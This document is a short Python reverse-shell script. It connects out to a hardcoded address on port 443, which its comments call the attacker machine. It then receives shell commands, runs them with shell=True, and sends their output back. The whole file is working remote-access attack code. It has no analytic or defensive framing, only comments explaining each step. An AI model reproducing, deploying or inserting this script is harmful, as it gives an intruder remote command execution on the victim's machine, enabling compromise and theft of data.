#!/usr/bin/python

import socket,subprocess

HOST = '192.168.1.1' # The remote host
PORT = 443 # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)) # Connect to attacker machine
s.send('[*] Connection Established!') # Send we are connected

while 1: # Start loop
    data = s.recv(1024)# Recieve shell command
    if data == "quit": 
        break# If its quit, then break out and close socket

    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Run shell command
    stdout_value = proc.stdout.read() + proc.stderr.read() # Read output
    s.send(stdout_value) # Send output to attacker

s.close() # Close socket
